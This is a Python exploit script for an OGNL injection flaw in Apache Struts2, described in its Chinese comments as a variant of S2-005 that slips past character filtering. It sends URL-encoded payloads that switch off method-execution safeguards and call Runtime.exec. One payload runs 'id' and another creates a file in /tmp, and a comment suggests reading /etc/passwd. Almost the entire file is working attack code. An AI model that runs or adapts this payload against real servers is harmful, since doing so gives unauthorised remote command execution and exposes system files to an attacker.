import argparse
import random
import re

import requests
from lib import base_def
from bs4 import BeautifulSoup


def target_test(url, payloads, proxies, headers):
    response = requests.get(url=url,params=payloads, proxies=proxies, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    print(response.url)
    if response.status_code == 200:
        if len(soup.find_all(string=re.compile("[OK]"))) and len(
                soup.find_all(string=re.compile("[^allowStaticMethodAccess]"))):
            print("vuln has been found!")
            return True
        else:
            print("vuln has not been found!")
            return False
    else:
        print("page has not been found!")
        return False


def target_attack(url, payloads, proxies, headers):
    response = requests.get(url=url,params=payloads, proxies=proxies, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    if response.status_code == 200:
        print(response.url)
        print("vuln has been attacked!")


if __name__ == '__main__':
    #-------------脚本初始化部分--------------------
    arg_parser = argparse.ArgumentParser()
    print("the scripts has 2 parameters")
    argparse = base_def.start_help(arg_parser)
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    #根据exp，如果命令是带空格的，就需要将shell_command的字符串变成数组：["cat","/etc/passwd"]
    shell_command = "touch /tmp/success" + str(random.randint(1, 100))
    #--------------------------------------------

    url = "http://" + argparse.ip + ":" + argparse.port + "/example5.action?"
    payloads_test = "age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true "
    #该payload基于S2-005的再变种，通过其他变量插入OGNL表达式，再使用<OGNL statement>&(example)('xxx')=1的方式执行，绕过官方对于’#‘，’\‘的限制，该攻击无回显。
    payloads_attack = "age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27"+shell_command+"%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true "

    target_test(url, payloads_test, proxies, header)
    target_attack(url, payloads_attack, proxies, header)
